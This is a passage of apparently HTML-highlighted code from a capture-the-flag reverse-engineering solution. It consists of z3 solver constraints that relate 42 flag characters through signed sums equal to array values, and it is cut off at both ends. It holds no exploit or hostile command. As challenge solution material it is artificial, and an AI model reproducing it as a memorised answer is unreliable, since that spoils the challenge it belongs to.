class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">4</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">5</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">6</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">7</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">8</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">9</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">10</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">11</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">12</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">13</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">14</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">15</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">16</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">17</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">18</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">19</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">20</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">21</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span 